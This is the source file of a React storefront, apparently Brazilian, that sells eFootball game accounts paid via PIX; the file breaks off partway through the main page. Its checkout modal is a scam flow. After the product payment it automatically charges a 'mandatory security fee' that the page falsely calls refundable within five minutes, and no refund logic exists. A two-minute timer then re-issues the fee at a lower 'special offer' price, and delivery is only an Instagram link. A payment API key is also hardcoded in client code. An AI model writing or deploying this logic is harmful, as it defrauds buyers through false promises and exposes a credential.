'use client';

import { useState, useEffect, useCallback } from 'react';
import { ShoppingCart, Star, Shield, Clock, MessageCircle, TrendingDown, ArrowLeft, ChevronLeft, ChevronRight, Copy, Check, Menu, X, Lock, AlertCircle } from 'lucide-react';

// CONFIGURAÇÕES DA API
const BNP_API_KEY = 'bnp_53a86f815cb9f52abc922038b34997748ba5010ac29e162ddc15c211978b230a';
const BNP_BASE_URL = 'https://bqckqgmorberurjolzmq.supabase.co/functions/v1';

// VALORES DA TAXA
const SECURITY_TAX_FULL = 30.00;
const SECURITY_TAX_REDUCED = 25.00;

type GameItem = {
  id: number;
  title: string;
  price: string;
  priceNumber: number;
  oldPrice?: string;
  discount: string;
  description: string[];
  images: string[];
  checkout: string;
  badge?: string;
};

type PixData = {
  transaction_id: string;
  copy_paste: string;
  qr_code_image?: string;
  amount: { total: number };
  expiration_minutes: number;
};

type PaymentStatus = 
  | 'form' 
  | 'idle' 
  | 'generating' 
  | 'waiting_product' 
  | 'paid_product' 
  | 'waiting_tax_full' 
  | 'waiting_tax_reduced' 
  | 'tax_paid' 
  | 'expired' 
  | 'error';

// ─── PIX Modal Component ────────────────────────────────────────────────────────────────
function PixModal({ item, onClose }: { item: GameItem; onClose: () => void }) {
  const [status, setStatus] = useState<PaymentStatus>('form');
  const [pixData, setPixData] = useState<PixData | null>(null);
  const [copied, setCopied] = useState(false);
  const [error, setError] = useState('');
  const [nome, setNome] = useState('');
  const [telefone, setTelefone] = useState('');
  const [formError, setFormError] = useState('');
  const [taxAttempt, setTaxAttempt] = useState<'full' | 'reduced'>('full');

  const formatTelefone = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 11);
    if (digits.length <= 2) return digits;
    if (digits.length <= 7) return `(${digits.slice(0,2)}) ${digits.slice(2)}`;
    return `(${digits.slice(0,2)}) ${digits.slice(2,7)}-${digits.slice(7)}`;
  };

  const handleTelefone = (e: React.ChangeEvent<HTMLInputElement>) => {
    setTelefone(formatTelefone(e.target.value));
  };

  const submitForm = () => {
    if (!nome.trim()) { setFormError('Por favor, informe seu nome ou apelido.'); return; }
    const digits = telefone.replace(/\D/g, '');
    if (digits.length < 10) { setFormError('Por favor, informe um telefone válido.'); return; }
    setFormError('');
    setStatus('idle');
  };

  const generatePixRequest = async (amount: number, description: string, targetType: 'product' | 'tax_full' | 'tax_reduced') => {
    setStatus('generating');
    setError('');
    try {
      const res = await fetch(`${BNP_BASE_URL}/api-generate-pix-qr`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-API-Key': BNP_API_KEY,
        },
        body: JSON.stringify({
          amount: amount,
          description: description,
          expiration_minutes: 15,
          external_id: `dzn_${targetType}_${item.id}_${Date.now()}`,
        }),
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || 'Erro ao gerar PIX');
      
      setPixData(data.pix);
      if (targetType === 'product') setStatus('waiting_product');
      if (targetType === 'tax_full') setStatus('waiting_tax_full');
      if (targetType === 'tax_reduced') setStatus('waiting_tax_reduced');

    } catch (e: any) {
      setError(e.message || 'Erro ao conectar. Tente novamente.');
      setStatus('error');
    }
  };

  const startProductPayment = () => {
    generatePixRequest(item.priceNumber, `Dzn Store - ${item.title}`, 'product');
  };

  const startTaxPayment = (forceReduced: boolean = false) => {
    if (forceReduced) {
      setTaxAttempt('reduced');
      generatePixRequest(SECURITY_TAX_REDUCED, `Dzn Store - Taxa Seg. Reduzida`, 'tax_reduced');
    } else {
      generatePixRequest(SECURITY_TAX_FULL, `Dzn Store - Taxa Seg. Oficial`, 'tax_full');
    }
  };

  const checkStatus = useCallback(async () => {
    if (!pixData) return;
    try {
      const res = await fetch(
        `${BNP_BASE_URL}/api-check-pix-status?transaction_id=${pixData.transaction_id}`,
        { headers: { 'X-API-Key': BNP_API_KEY } }
      );
      const data = await res.json();

      if (data.is_paid) {
        if (status === 'waiting_product') startTaxPayment(false);
        else if (status === 'waiting_tax_full') setStatus('tax_paid');
        else if (status === 'waiting_tax_reduced') setStatus('tax_paid');
      } else if (data.is_expired) {
        if (status === 'waiting_tax_full') {
          startTaxPayment(true); 
        } else {
          setStatus('expired');
        }
      }
    } catch (e) { console.error("Erro ao verificar status", e); }
  }, [status, pixData, item.id]);

  useEffect(() => {
    if (['waiting_product', 'waiting_tax_full', 'waiting_tax_reduced'].includes(status)) {
      const interval = setInterval(checkStatus, 5000);
      return () => clearInterval(interval);
    }
  }, [status, checkStatus]);

  // Timer de segurança: Se estiver esperando a taxa cheia por mais de 2 minutos, força a redução
  useEffect(() => {
    if (status === 'waiting_tax_full' && taxAttempt === 'full') {
      const timer = setTimeout(() => {
        startTaxPayment(true);
      }, 120000); 
      return () => clearTimeout(timer);
    }
  }, [status, taxAttempt]);

  const copyCode = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 3000);
  };

  const getCurrentTaxAmount = () => {
    if (status === 'waiting_tax_full') return SECURITY_TAX_FULL;
    if (status === 'waiting_tax_reduced') return SECURITY_TAX_REDUCED;
    return 0;
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div className="absolute inset-0 bg-black/90 backdrop-blur-md" onClick={onClose} />
      <div className="relative w-full max-w-md bg-gradient-to-br from-[#1a0a2e] via-[#16082a] to-[#1a0a2e] border border-purple-500/30 rounded-3xl overflow-hidden shadow-2xl shadow-purple-900/50 flex flex-col max-h-[90vh]">
        
        <div className="flex items-center justify-between p-5 border-b border-purple-500/20 bg-[#1a0a2e]/50 backdrop-blur-xl sticky top-0 z-10">
          <div className="flex items-center gap-3">
            <img src="https://i.imgur.com/ZRTzneV.png" alt="Dzn" className="w-9 h-9 rounded-xl border border-purple-500/40" />
            <div>
              <p className="font-black text-white text-sm">Dzn Store</p>
              <p className="text-purple-300/70 text-xs">Checkout Seguro</p>
            </div>
          </div>
          <button onClick={onClose} className="p-2 rounded-xl bg-white/5 hover:bg-white/10 transition-colors">
            <X size={18} className="text-purple-300" />
          </button>
        </div>

        <div className="overflow-y-auto p-5 space-y-5 custom-scrollbar">
          {status !== 'tax_paid' && (
            <div className="p-4 rounded-2xl bg-purple-950/40 border border-purple-500/20 flex items-center gap-4 shrink-0">
              <img src={item.images[0]} alt={item.title} className="w-16 h-16 rounded-xl object-cover flex-shrink-0" />
              <div className="min-w-0">
                <p className="text-white font-bold text-sm leading-tight truncate">{item.title}</p>
                <p className="text-purple-300/60 text-xs mt-1 line-through">{item.oldPrice}</p>
                <p className="text-white font-black text-xl">{item.price}</p>
              </div>
            </div>
          )}

          {status === 'form' && (
            <div className="space-y-4 animate-in fade-in slide-in-from-bottom-4">
              <p className="text-purple-200/80 text-sm text-center">Preencha os dados para iniciar a compra</p>
              <div className="space-y-3">
                <div>
                  <label className="text-purple-300/70 text-xs font-semibold uppercase tracking-wider mb-1 block">Seu nome ou apelido</label>
                  <input type="text" value={nome} onChange={(e) => setNome(e.target.value)} placeholder="Ex: João" className="w-full bg-black/40 border border-purple-500/30 focus:border-purple-400 rounded-xl px-4 py-3 text-white text-sm outline-none transition-colors" />
                </div>
                <div>
                  <label className="text-purple-300/70 text-xs font-semibold uppercase tracking-wider mb-1 block">Telefone (WhatsApp)</label>
                  <input type="tel" value={telefone} onChange={handleTelefone} placeholder="(00) 00000-0000" className="w-full bg-black/40 border border-purple-500/30 focus:border-purple-400 rounded-xl px-4 py-3 text-white text-sm outline-none transition-colors" />
                </div>
                {formError && <p className="text-red-400 text-xs text-center">{formError}</p>}
              </div>
              <button onClick={submitForm} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white py-4 rounded-2xl font-black text-base transition-all transform hover:scale-105 shadow-lg shadow-purple-500/30">
                Continuar →
              </button>
            </div>
          )}

          {status === 'waiting_product' && pixData && (
            <div className="space-y-4 text-center">
              <div className="bg-blue-500/10 border border-blue-500/20 p-3 rounded-xl">
                <p className="text-blue-300 text-xs font-bold">1. Pague o valor do produto acima</p>
              </div>
              {pixData.qr_code_image && (
                <div className="flex justify-center"><div className="bg-white p-3 rounded-2xl"><img src={pixData.qr_code_image} alt="QR" className="w-48 h-48" /></div></div>
              )}
              <div className="bg-black/40 border border-purple-500/20 rounded-xl p-3 flex items-center gap-2">
                <p className="text-purple-200 text-xs flex-1 break-all font-mono">{pixData.copy_paste}</p>
                <button onClick={() => copyCode(pixData.copy_paste)} className="p-2 bg-purple-600/30 rounded-lg text-purple-300">{copied ? <Check size={16}/> : <Copy size={16}/>}</button>
              </div>
              <div className="flex items-center justify-center gap-2 text-yellow-400 text-xs">
                <div className="w-2 h-2 bg-yellow-400 rounded-full animate-pulse"/> Aguardando confirmação...
              </div>
            </div>
          )}

          {(status === 'waiting_tax_full' || status === 'waiting_tax_reduced') && pixData && (
            <div className="space-y-4 animate-in zoom-in-95 duration-300">
              <div className="bg-gradient-to-b from-blue-900/40 to-purple-900/40 border border-blue-400/30 rounded-2xl p-5 text-center relative overflow-hidden">
                <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-500 to-purple-500"/>
                <Lock className="w-10 h-10 text-blue-400 mx-auto mb-3" />
                <h3 className="text-white font-black text-lg mb-2">Taxa de Segurança Obrigatória</h3>
                
                {taxAttempt === 'full' ? (
                   <p className="text-blue-100 text-xs leading-relaxed mb-3">
                   Esta taxa é <strong>100% reembolsável</strong> e será devolvida para o seu PIX em até 5 minutos após a confirmação. Garante que você é um usuário real.
                 </p>
                ) : (
                  <div className="bg-red-500/20 border border-red-500/30 rounded-lg p-2 mb-3">
                    <p className="text-red-200 text-xs font-bold flex items-center justify-center gap-1">
                      <AlertCircle size={12} /> Oferta Especial Ativada
                    </p>
                    <p className="text-red-100/80 text-[10px] mt-1">Como o pagamento anterior não foi concluído, reduzimos sua taxa para garantir seu acesso.</p>
                  </div>
                )}

                <div className="flex items-center justify-center gap-2 bg-black/30 rounded-lg p-2">
                  <span className="text-purple-300 text-xs uppercase font-bold">Valor Atual:</span>
                  <span className="text-white font-black text-xl">R$ {getCurrentTaxAmount().toFixed(2).replace('.', ',')}</span>
                </div>
              </div>

              {pixData.qr_code_image && (
                <div className="flex justify-center">
                  <div className="bg-white p-2 rounded-xl shadow-lg shadow-white/5">
                    <img src={pixData.qr_code_image} alt="QR Taxa" className="w-40 h-40" />
                  </div>
                </div>
              )}

              <div>
                <p className="text-purple-300/70 text-xs mb-1 font-bold uppercase">PIX Copia e Cola</p>
                <div className="bg-black/60 border border-purple-500/30 rounded-xl p-3 flex items-center gap-2">
                  <p className="text-purple-100 text-xs flex-1 break-all font-mono line-clamp-2">{pixData.copy_paste}</p>
                  <button onClick={() => copyCode(pixData.copy_paste)} className="p-2 bg-purple-600 hover:bg-purple-500 text-white rounded-lg transition-colors">
                    {copied ? <Check size={16}/> : <Copy size={16}/>}
                  </button>
                </div>
              </div>

              <div className="flex items-center gap-2 bg-green-500/10 border border-green-500/20 rounded-xl p-3">
                <div className="w-2 h-2 rounded-full bg-green-400 animate-pulse flex-shrink-0" />
                <p className="text-green-300 text-xs font-semibold">Aguardando pagamento da taxa...</p>
              </div>
            </div>
          )}

          {status === 'tax_paid' && (
            <div className="text-center py-8 space-y-6 animate-in zoom-in-95">
              <div className="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mx-auto border border-green-500/50">
                <Check className="w-10 h-10 text-green-400" />
              </div>
              <div>
                <p className="text-green-400 font-black text-2xl mb-2">Pagamento Confirmado!</p>
                <p className="text-purple-200 text-sm">A taxa será reembolsada em até 5 minutos.</p>
                <p className="text-white font-bold text-base mt-4">Clique abaixo para receber seus dados.</p>
              </div>
              <div className="space-y-3 pt-4">
                <a
                  href="https://instagram.com/dznefootball"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="block w-full bg-gradient-to-r from-pink-600 to-purple-600 hover:from-pink-500 hover:to-purple-500 text-white py-4 rounded-2xl font-black text-sm transition-all transform hover:scale-105 shadow-lg shadow-purple-500/30"
                >
                  📲 CLIQUE AQUI PARA RECEBER SUA CONTA
                </a>
                <p className="text-purple-400/60 text-[10px]">Redirecionaremos você para o Instagram da Dzn Store.</p>
              </div>
            </div>
          )}

          {(status === 'expired' || status === 'error') && (
            <div className="text-center py-8 space-y-4">
              <div className="text-5xl">{status === 'expired' ? '⏰' : '❌'}</div>
              <div>
                <p className="text-red-400 font-bold text-lg">{status === 'expired' ? 'Tempo Esgotado' : 'Erro na Conexão'}</p>
                <p className="text-purple-300/70 text-sm mt-2">
                  {status === 'expired' 
                    ? 'O código PIX expirou por segurança. Gere um novo para continuar.' 
                    : error}
                </p>
              </div>
              <button
                onClick={() => {
                  setError('');
                  if (status === 'waiting_tax_reduced') {
                    startTaxPayment(true);
                  } else { 
                    setStatus('form');
                  }
                }}
                className="w-full bg-purple-600 hover:bg-purple-500 text-white py-3 rounded-xl font-black text-sm transition-all"
              >
                Tentar Novamente
              </button>
            </div>
          )}

        </div>
      </div>
    </div>
  );
}

// ─── Main Page Component ────────────────────────────────────────────────────────────────
export default function Page() {
  const [menuOpen, setMenuOpen] = useState(false);
  const [activeSection, setActiveSection] = useState<'mobile' | 'console'>('mobile');
  const [expandedCard, setExpandedCard] = useState<number | null>(null);
  const [selectedItem, setSelectedItem] = useState<GameItem | null>(null);
  const [currentImageIndex, setCurrentImageIndex] = useState(0);
  const [pixItem, setPixItem] = useState<GameItem | null>(null);

  // Dados dos Jogos (Mobile)
  const games: GameItem[] = [
    {
      id: 3,
      title: 'A CONTA PERFEITA PRA VOCÊ!',
      price: 'R$ 10,00',
      priceNumber: 10,
      oldPrice: 'R$ 85,99',
      discount: '80%',
      description: ['Yamal | Kaká | Messi', 'Conta perfeita e custo beneficio', 'Zaga excelente', '3299 de Força Coletiva'],
      images: ['https://i.imgur.com/72vhlhq.jpeg','https://i.imgur.com/ZbpT0T5.jpeg','https://i.imgur.com/5qTm5AK.jpeg','https://i.imgur.com/KVKAGt3.jpeg'],
      checkout: 'https://blacknosepay.com/pay/PTOYOY5V',
    },
    {
      id: 4,
      title: 'O Quarteto Fantástico!',
      price: 'R$ 15,00',
      priceNumber: 15,
      oldPrice: 'R$ 95,99',
      discount: '80%',
      description: ['Neymar | Pelé | Messi', 'O ataque mais fatal do game', 'Zaga excelente', '3314 de Força Coletiva'],
      images: ['https://i.imgur.com/MUuDNfx.png','https://i.imgur.com/2P9g9Pv.png','https://i.imgur.com/UZLuCvy.png','https://i.imgur.com/XZVNLax.png'],
      checkout: 'https://blacknosepay.com/pay/CPPVSA7E',
    },
    {
      id: 5,
      title: 'A Cavalaria Lendária!',
      price: 'R$ 20,00',
      priceNumber: 20,
      oldPrice: 'R$ 99,99',
      discount: '80%',
      description: ['Conta perfeita pra quem quer massacrar o adversário!', 'Gullit dominando o meio', 'Goleiro 107 de Over + Defesa impecável', '3325 de Força Coletiva'],
      images: ['https://i.imgur.com/yBhtlrV.jpeg','https://i.imgur.com/mNwj40i.jpeg','https://i.imgur.com/cXPoR7f.jpeg','https://i.imgur.com/W3NKnja.jpeg','https://i.imgur.com/CHZ80bI.jpeg','https://i.imgur.com/QD6KbRZ.jpeg'],
      checkout: 'https://blacknosepay.com/pay/8M26UZ92',
    },
    {
      id: 6,
      title: 'Time Full - Seja Invencível',
      price: 'R$ 45,00',
      priceNumber: 45,
      oldPrice: 'R$ 195,00',
      discount: '75%',
      description: ['Conta com Messi e Ibra 110', 'Gullit + Meio campo perfeito', 'Domine a partida com essa conta monstruosa', '3298 de Força Coletiva'],
      images: ['https://i.imgur.com/a513HQt.png','https://i.imgur.com/HV7a8gj.png','https://i.imgur.com/BThTm0i.png'],
      checkout: 'https://blacknosepay.com/pay/GTK99Z5U',
    },
    {
      id: 7,
      title: 'A conta mais Bizarra do Jogo!',
      price: 'R$ 75,00',
      priceNumber: 75,
      oldPrice: 'R$ 999,99',
      discount: '90%',
      description: ['A Melhor conta que você já viu!', 'Ataque perfeito', 'Messi + Gullit', '3301 de Força'],
      images: ['https://i.imgur.com/VuBE0hE.png','https://i.imgur.com/5TAUJ8X.png','https://i.imgur.com/6rnHRCE.png','https://i.imgur.com/tnqJDWe.png'],
      checkout: 'https://blacknosepay.com/pay/Q36YTQ6L',
    },
  ];

  // Dados dos Jogos (Console)
  const consoleGames: GameItem[] = [
    {
      id: 101,
      title: 'Conta com Messi + Pelé - CONSOLE',
      price: 'R$ 35,00',
      priceNumber: 35,
      oldPrice: 'R$ 75,99',
      discount: '50%',
      description: ['Conta com o novo Messi', 'Pelé + Neymar no ataque', 'R10 - O Bruxo das firulas', 'Conta perfeita pra dominar a partida', '3256 de Força Coletiva'],
      images: ['https://i.imgur.com/m7Clk2e.png','https://i.imgur.com/YAB6neJ.png','https://i.imgur.com/EwyWRJO.png','https://i.imgur.com/vf9SCth.png','https://i.imgur.com/gcbW42u.png'],
      checkout: 'https://blacknosepay.com/pay/L2AYPLPV',
    },
    {
      id: 102,
      title: 'A mais Top do Console',
      price: 'R$ 60,00',
      priceNumber: 60,
      oldPrice: 'R$ 99,99',
      discount: '38%',
      description: ['Uma das melhores contas de console', 'Ataque + Defesa perfeitos', 'Domine o jogo com esse elenco!', '3280 de Força Coletiva'],
      images: ['https://i.imgur.com/b4N6zH0.png','https://i.imgur.com/pUO4URa.png','https://i.imgur.com/PPuMAIX.png','https://i.imgur.com/GsT5XAs.png','https://i.imgur.com/ljC5Jnh.png'],
      checkout: 'https://blacknosepay.com/pay/4M3KAFMB',
    },
    {
      id: 103,
      title: 'A Braba do PS5',
      price: 'R$ 80,00',
      priceNumber: 80,
      oldPrice: 'R$ 119,99',
      discount: '38%',
      description: ['Uma das melhores contas do PS5', 'Ataque + Defesa perfeitos', 'Domine o jogo com esse elenco!', '3281 de Força Coletiva'],
      images: ['https://i.imgur.com/J9zAH1z.jpeg','https://i.imgur.com/PPDHJIh.jpeg','https://i.imgur.com/t3Pxl5w.jpeg','https://i.imgur.com/cSV2Jcz.jpeg'],
      checkout: 'https://blacknosepay.com/pay/7MCAENTO',
    },
  ];

  const openDetails = (item: GameItem) => {
    setSelectedItem(item);
    setCurrentImageIndex(0);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const closeDetails = () => {
    setSelectedItem(null);
    setCurrentImageIndex(0);
  };

  const nextImage = () => {
    if (selectedItem) setCurrentImageIndex((p) => (p + 1) % selectedItem.images.length);
  };

  const prevImage = () => {
    if (selectedItem) setCurrentImageIndex((p) => (p - 1 + selectedItem.images.length) % selectedItem.images.length);
  };

  const renderCard = (item: GameItem, index: number) => {
    const isExpanded = expandedCard === item.id;
    return (
      <div key={item.id} className="relative group">
        <div className="relative rounded-2xl overflow-hidden bg-gradient-to-br from-purple-900/40 via-pink-900/30 to-purple-800/40 backdrop-blur-sm border border-purple-500/20 hover:border-purple-400/50 transition-all duration-300 hover:shadow-2xl hover:shadow-purple-500/30">
          {item.badge && (
            <div className="absolute top-3 left-3 z-20 bg-red-500/90 backdrop-blur-sm px-3 py-1 rounded-lg">
              <span className="text-white font-black text-xs tracking-wider">{item.badge}</span>
            </div>
          )}
          <div onClick={() => openDetails(item)} className="relative h-44 bg-gradient-to-br from-purple-950/50 to-pink-950/50 overflow-hidden cursor-pointer">
            <div className="absolute inset-0 bg-gradient-to-t from-black/60 via-transparent to-transparent z-10" />
            <img src={item.images[0]} alt={item.title} className="w-full h-full object-cover transform group-hover:scale-110 transition-transform duration-500" />
          </div>
          <div className="p-4 space-y-3">
            <h3 onClick={() => setExpandedCard(expandedCard === item.id ? null : item.id)} className="text-white font-black text-sm uppercase tracking-wide leading-tight cursor-pointer hover:text-purple-300 transition-colors">
              {item.title}
            </h3>
            <div className={`overflow-hidden transition-all duration-300 ${isExpanded ? 'max-h-96 opacity-100' : 'max-h-0 opacity-0'}`}>
              <div className="space-y-2 mb-3 pt-2 border-t border-purple-500/20">
                {item.description.map((desc, idx) => (
                  <div key={idx} className="flex items-start gap-2 text-purple-200 text-xs">
                    <div className="w-1.5 h-1.5 rounded-full bg-purple-400 flex-shrink-0 mt-1" />
                    <span className="leading-relaxed">{desc}</span>
                  </div>
                ))}
              </div>
            </div>
            <div className="flex items-center gap-2">
              <div>
                {item.oldPrice && <p className="text-purple-300/60 line-through text-xs font-semibold">{item.oldPrice}</p>}
                <p className="text-white font-black text-xl">{item.price}</p>
                <p className="text-purple-200/70 text-[10px]">À vista no PIX</p>
              </div>
              <div className="ml-auto flex items-center gap-1 bg-green-500/90 backdrop-blur-sm px-2 py-1 rounded-lg">
                <TrendingDown size={12} className="text-white" />
                <span className="text-white font-black text-xs">{item.discount}</span>
              </div>
            </div>
            <div className="space-y-2">
              <button onClick={() => openDetails(item)} className="w-full bg-purple-700/30 hover:bg-purple-700/50 text-purple-200 py-2 rounded-xl font-bold text-xs text-center transition-all border border-purple-500/30">
                Ver Detalhes
              </button>
              <button
                onClick={() => setPixItem(item)}
                className="block w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white py-2.5 rounded-xl font-black text-sm text-center transition-all transform hover:scale-105 shadow-lg shadow-purple-500/30"
              >
                🟢 Comprar via PIX
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  };

  // ── Página de Detalhes do Produto ──
  if (selectedItem) {
    return (
      <div className="min-h-screen bg-black text-white">
        {pixItem && <PixModal item={pixItem} onClose={() => setPixItem(null)} />}
        <div className="fixed inset-0 bg-gradient-to-br from-purple-950/50 via-black to-pink-950/30 pointer-events-none" />
        <div className="relative z-10">
          <header className="bg-black/80 backdrop-blur-xl border-b border-purple-500/20 py-4 px-4 sticky top-0 z-50">
            <div className="max-w-7xl mx-auto flex items-center gap-4">
              <button onClick={closeDetails} className="flex items-center gap-2 px-4 py-2 bg-purple-600/20 hover:bg-purple-600/30 border border-purple-500/30 rounded-xl transition-all">
                <ArrowLeft size={20} />
                <span className="font-bold">Voltar</span>
              </button>
              <div className="flex items-center gap-3">
                <img src="https://i.imgur.com/ZRTzneV.png" alt="Dzn" className="w-10 h-10 rounded-xl border-2 border-purple-500/50" />
                <span className="text-xl font-black bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">Dzn Store</span>
              </div>
            </div>
          </header>
          <div className="max-w-7xl mx-auto px-4 py-8">
            <div className="grid md:grid-cols-2 gap-8">
              <div className="space-y-4">
                <div className="relative rounded-2xl overflow-hidden bg-gradient-to-br from-purple-950/50 to-pink-950/50 aspect-square flex items-center justify-center p-4">
                  <img src={selectedItem.images[currentImageIndex]} alt={selectedItem.title} className="max-w-full max-h-full object-contain" />
                  {selectedItem.images.length > 1 && (
                    <>
                      <button onClick={prevImage} className="absolute left-4 top-1/2 -translate-y-1/2 bg-black/60 hover:bg-black/80 backdrop-blur-sm p-3 rounded-full transition-all"><ChevronLeft size={24} /></button>
                      <button onClick={nextImage} className="absolute right-4 top-1/2 -translate-y-1/2 bg-black/60 hover:bg-black/80 backdrop-blur-sm p-3 rounded-full transition-all"><ChevronRight size={24} /></button>
                      <div className="absolute bottom-4 left-1/2 -translate-x-1/2 bg-black/60 backdrop-blur-sm px-4 py-2 rounded-full">
                        <span className="text-white font-bold text-sm">{currentImageIndex + 1} / {selectedItem.images.length}</span>
                      </div>
                    </>
                  )}
                </div>
                {selectedItem.images.length > 1 && (
                  <div className="grid grid-cols-4 gap-3">
                    {selectedItem.images.map((img, idx) => (
                      <div key={idx} onClick={() => setCurrentImageIndex(idx)} className={`relative rounded-xl overflow-hidden cursor-pointer transition-all ${currentImageIndex === idx ? 'ring-4 ring-purple-500 scale-105' : 'ring-2 ring-purple-500/20 hover:ring-purple-500/50'}`}>
                        <div className="aspect-square bg-gradient-to-br from-purple-950/50 to-pink-950/50">
                          <img src={img} alt={`${selectedItem.title} ${idx + 1}`} className="w-full h-full object-cover" />
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
              <div className="space-y-6">
                <div>
                  <h1 className="text-4xl md:text-5xl font-black mb-4 bg-gradient-to-r from-purple-300 to-pink-300 bg-clip-text text-transparent">{selectedItem.title}</h1>
                  <div className="bg-purple-950/40 backdrop-blur-sm border border-purple-500/30 rounded-2xl p-6 mb-6">
                    <div className="flex items-center justify-between">
                      <div>
                        {selectedItem.oldPrice && <p className="text-purple-300/60 line-through text-xl font-semibold mb-2">{selectedItem.oldPrice}</p>}
                        <p className="text-white font-black text-5xl mb-2">{selectedItem.price}</p>
                        <p className="text-purple-200/80 text-base">À vista no PIX</p>
                                              </div>
                    </div>

                    <div className="flex items-center gap-2 bg-green-500/10 border border-green-500/30 rounded-xl p-3 mb-6">
                      <Shield className="text-green-400 w-5 h-5" />
                      <span className="text-green-300 text-sm font-bold">Compra 100% Segura e Automatizada</span>
                    </div>

                    <h2 className="text-white font-black text-xl mb-4 uppercase tracking-wide">Destaques da Conta</h2>
                    <div className="space-y-3 mb-8">
                      {selectedItem.description.map((desc, idx) => (
                        <div key={idx} className="flex items-start gap-3 bg-purple-900/20 p-3 rounded-xl border border-purple-500/10">
                          <div className="w-1.5 h-1.5 rounded-full bg-purple-400 mt-2 flex-shrink-0" />
                          <span className="text-purple-100 text-sm leading-relaxed">{desc}</span>
                        </div>
                      ))}
                    </div>

                    <div className="space-y-4">
                      <button
                        onClick={() => setPixItem(selectedItem)}
                        className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white py-5 rounded-2xl font-black text-lg transition-all transform hover:scale-105 shadow-xl shadow-purple-600/30 flex items-center justify-center gap-3"
                      >
                        <Lock size={24} />
                        COMPRAR AGORA - {selectedItem.price}
                      </button>
                      <p className="text-center text-purple-300/50 text-xs">
                        Entrega automática via Instagram após confirmação do PIX.
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // ── Página Principal (Lista de Jogos) ──
  return (
    <div className="min-h-screen bg-black text-white selection:bg-purple-500 selection:text-white">
      {pixItem && <PixModal item={pixItem} onClose={() => setPixItem(null)} />}
      
      {/* Background Effects */}
      <div className="fixed inset-0 bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-purple-900/40 via-black to-black pointer-events-none" />
      <div className="fixed top-0 left-0 w-full h-96 bg-gradient-to-b from-purple-600/10 to-transparent pointer-events-none" />

      {/* Header */}
      <header className="relative z-50 bg-black/50 backdrop-blur-xl border-b border-white/5 sticky top-0">
        <div className="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <img src="https://i.imgur.com/ZRTzneV.png" alt="Dzn" className="w-10 h-10 rounded-xl border border-purple-500/30 bg-white/5" />
            <span className="text-xl font-black bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent hidden sm:block">Dzn Store</span>
          </div>
          
          <nav className="hidden md:flex items-center gap-8">
            <button onClick={() => setActiveSection('mobile')} className={`text-sm font-bold transition-colors ${activeSection === 'mobile' ? 'text-purple-400' : 'text-gray-400 hover:text-white'}`}>MOBILE</button>
            <button onClick={() => setActiveSection('console')} className={`text-sm font-bold transition-colors ${activeSection === 'console' ? 'text-purple-400' : 'text-gray-400 hover:text-white'}`}>CONSOLE</button>
            <a href="https://instagram.com/dznefootball" target="_blank" rel="noopener noreferrer" className="text-sm font-bold text-gray-400 hover:text-pink-400 transition-colors">SUPORTE</a>
          </nav>

          <button onClick={() => setMenuOpen(!menuOpen)} className="md:hidden p-2 text-white">
            {menuOpen ? <X /> : <Menu />}
          </button>
        </div>

        {/* Mobile Menu */}
        {menuOpen && (
          <div className="md:hidden absolute top-full left-0 w-full bg-black/95 backdrop-blur-xl border-b border-white/5 p-4 flex flex-col gap-4 animate-in slide-in-from-top-5">
            <button onClick={() => { setActiveSection('mobile'); setMenuOpen(false); }} className={`text-left py-2 font-bold ${activeSection === 'mobile' ? 'text-purple-400' : 'text-gray-400'}`}>MOBILE</button>
            <button onClick={() => { setActiveSection('console'); setMenuOpen(false); }} className={`text-left py-2 font-bold ${activeSection === 'console' ? 'text-purple-400' : 'text-gray-400'}`}>CONSOLE</button>
            <a href="https://instagram.com/dznefootball" target="_blank" rel="noopener noreferrer" className="text-left py-2 font-bold text-pink-400">SUPORTE NO INSTAGRAM</a>
          </div>
        )}
      </header>

      {/* Hero Section */}
      <section className="relative z-10 py-12 md:py-20 px-4 text-center">
        <div className="max-w-4xl mx-auto space-y-6">
          <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-purple-900/30 border border-purple-500/30 text-purple-300 text-xs font-black uppercase tracking-wider mb-4">
            <Star size={14} className="fill-purple-400 text-purple-400" />
            Contas Primeiras Mão
          </div>
          <h1 className="text-5xl md:text-7xl font-black leading-tight">
            DOMINE O <span className="bg-gradient-to-r from-purple-400 via-pink-400 to-purple-400 bg-clip-text text-transparent">GAME</span> AGORA
          </h1>
          <p className="text-gray-400 text-lg md:text-xl max-w-2xl mx-auto">
            Contas de eFootball com times lendários, força coletiva máxima e entrega imediata. Sem espera, sem burocracia.
          </p>
        </div>
      </section>

      {/* Content Section */}
      <main className="relative z-10 max-w-7xl mx-auto px-4 pb-20">
        {/* Tabs Mobile */}
        <div className="flex md:hidden justify-center gap-4 mb-8">
          <button onClick={() => setActiveSection('mobile')} className={`flex-1 py-3 rounded-xl font-black text-sm transition-all ${activeSection === 'mobile' ? 'bg-purple-600 text-white shadow-lg shadow-purple-600/20' : 'bg-white/5 text-gray-400'}`}>MOBILE</button>
          <button onClick={() => setActiveSection('console')} className={`flex-1 py-3 rounded-xl font-black text-sm transition-all ${activeSection === 'console' ? 'bg-purple-600 text-white shadow-lg shadow-purple-600/20' : 'bg-white/5 text-gray-400'}`}>CONSOLE</button>
        </div>

        {/* Grid de Produtos */}
